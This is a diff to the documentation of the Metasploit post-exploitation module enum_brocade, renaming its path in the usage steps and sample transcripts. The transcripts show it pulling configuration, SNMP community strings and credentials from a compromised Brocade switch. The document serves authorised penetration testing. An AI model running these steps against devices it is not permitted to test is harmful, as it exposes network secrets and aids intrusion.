@@ -24,7 +24,7 @@
 
   1. Start msfconsole
   2. Get a shell
-  3. Do: ```use post/brocade/gather/enum_brocade```
+  3. Do: ```use post/networking/gather/enum_brocade```
   4. Do: ```set session [id]```
   5. Do: ```set verbose true```
   6. Do: ```run```
@@ -36,7 +36,7 @@
 #### SSH Session with password-display off
 
 ```
-resource (brocade.rb)> use post/brocade/gather/enum_brocade
+resource (brocade.rb)> use post/networking/gather/enum_brocade
 resource (brocade.rb)> set session 1
 session => 1
 resource (brocade.rb)> set verbose true
@@ -54,7 +54,7 @@ resource (brocade.rb)> run
 #### SSH Session with Enable run 
 
 ```
-resource (brocade.rb)> use post/brocade/gather/enum_brocade
+resource (brocade.rb)> use post/networking/gather/enum_brocade
 resource (brocade.rb)> set session 1
 session => 1
 resource (brocade.rb)> set verbose true
@@ -70,7 +70,7 @@ verbose => true
 [+] ENCRYPTED SNMP community $MlVzZCFAbg== with permissions ro
 [+] ENCRYPTED SNMP community $U2kyXj1k with permissions rw
 [*] Post module execution completed
-msf5 post(brocade/gather/enum_brocade) > loot
+msf5 post(networking/gather/enum_brocade) > loot
 
 Loot
 ====
@@ -80,7 +80,7 @@ host       service  type             name         content     info              
 10.0.4.51           brocade.version  version.txt  text/plain  Brocade Version        /root/.msf4/loot/20190601221959_default_10.0.4.51_brocade.version_003751.txt
 10.0.4.51           brocade.config   config.txt   text/plain  Brocade Configuration  /root/.msf4/loot/20190601222004_default_10.0.4.51_brocade.config_998514.txt
 
-msf5 post(brocade/gather/enum_brocade) > creds
+msf5 post(networking/gather/enum_brocade) > creds
 Credentials
 ===========
 
